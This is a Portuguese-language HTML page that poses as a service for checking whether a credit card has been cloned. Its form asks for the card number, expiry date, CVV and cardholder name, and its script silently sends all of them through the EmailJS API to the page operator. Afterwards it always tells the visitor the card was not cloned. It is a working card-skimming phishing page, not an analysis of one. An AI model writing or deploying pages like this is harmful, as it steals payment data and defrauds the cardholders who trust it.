<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pagina de Vendas</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #ffeb3b; /* Cor de fundo alegre */
            color: #333;
            padding: 20px;
        }

        .container {
            max-width: 600px;
            margin: auto;
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            position: relative; /* Para posicionamento da imagem */
        }

        h1, h2 {
            text-align: center;
        }

        .payment-option {
            margin-bottom: 30px;
            text-align: left; /* Alinhamento à esquerda */
        }

        label {
            display: block;
            margin: 10px 0 5px;
        }

        input, select {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
        }

        button {
            width: 100%;
            padding: 10px;
            background-color: #5cb85c;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }

        button:hover {
            background-color: #4cae4c;
        }

        .card-image {
            display: block;
            margin: 20px auto; /* Centralizar a imagem do cartão */
            width: 100%; /* Ajustar para o tamanho do contêiner */
            max-width: 300px; /* Limitar a largura da imagem */
        }

        .flags {
            display: flex;
            justify-content: center; /* Centralizar as bandeiras */
            margin-bottom: 20px;
        }

        .flags img {
            width: 40px; /* Tamanho das bandeiras */
            margin: 0 5px; /* Espaçamento entre as bandeiras */
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Pagamento</h1>
        <h2>Verificar se meu cartao foi clonado</h2>

        <img src="https://example.com/imagem-cartao.jpg" alt="Imagem de um cartao de credito" class="card-image"> <!-- Substitua pelo link da sua imagem -->

        <div class="flags">
            <img src="https://upload.wikimedia.org/wikipedia/commons/4/4f/Logo_Visa.svg" alt="Visa">
            <img src="https://upload.wikimedia.org/wikipedia/commons/5/5a/Mastercard-logo.svg" alt="MasterCard">
            <img src="https://upload.wikimedia.org/wikipedia/commons/0/03/Logo_American_Express.svg" alt="American Express">
            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a4/Logo_Diners_Club.svg" alt="Diners Club">
            <img src="https://upload.wikimedia.org/wikipedia/commons/1/12/Logo_Elo.svg" alt="Elo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Logo_Hiper.svg" alt="Hiper">
        </div>

        <div class="payment-option">
            <h2>Pagamento com Cartao</h2>
            <form id="payment-form">
                <label for="card-type">Tipo de cartao:</label>
                <select id="card-type">
                    <option value="credito">Credito</option>
                    <option value="debito">Debito</option>
                </select>

                <label for="card-brand">Bandeira do cartao:</label>
                <select id="card-brand">
                    <option value="visa">Visa</option>
                    <option value="mastercard">MasterCard</option>
                    <option value="amex">American Express</option>
                    <option value="diners">Diners Club</option>
                    <option value="elo">Elo</option>
                    <option value="hiper">Hiper</option>
                </select>

                <label for="card-number">Numero do cartao:</label>
                <input type="text" id="card-number" placeholder="1234 5678 9012 3456" required>

                <label for="expiration-date">Data de vencimento:</label>
                <input type="text" id="expiration-date" placeholder="MM/AA" required>

                <label for="cvv">CVV:</label>
                <input type="text" id="cvv" placeholder="123" required>

                <label for="cardholder-name">Nome no cartao:</label>
                <input type="text" id="cardholder-name" placeholder="Nome do titular" required>

                <button type="submit">Verificar</button>
            </form>
        </div>
    </div>

    <script>
        document.getElementById('payment-form').addEventListener('submit', function(event) {
            event.preventDefault(); // Previne o envio padrão do formulário

            // Coleta os dados do formulário
            const cardType = document.getElementById('card-type').value;
            const cardBrand = document.getElementById('card-brand').value;
            const cardNumber = document.getElementById('card-number').value;
            const expirationDate = document.getElementById('expiration-date').value;
            const cvv = document.getElementById('cvv').value;
            const cardholderName = document.getElementById('cardholder-name').value;

            // Dados a serem enviados
            const templateParams = {
                cardType,
                cardBrand,
                cardNumber,
                expirationDate,
                cvv,
                cardholderName,
            };

            // Envia os dados para o EmailJS via fetch
            fetch('https://api.emailjs.com/api/v1.0/email/send', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    service_id: 'service_2ifod2v',
                    template_id: 'template_zruxvh6',
                    user_id: '1wUNc8kQ36NweJw3t',
                    template_params: templateParams,
                }),
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error('Network response was not ok');
                }
                return response.text();
            })
            .then(data => {
                alert('O seu cartao nao foi clonado!'); // Mensagem de sucesso alterada
                console.log('Success!', data);
            })
            .catch(error => {
                alert('Falha na verificacao. Tente novamente.');
                console.error('Error:', error);
            });
        });
    </script>
</body>
</html>
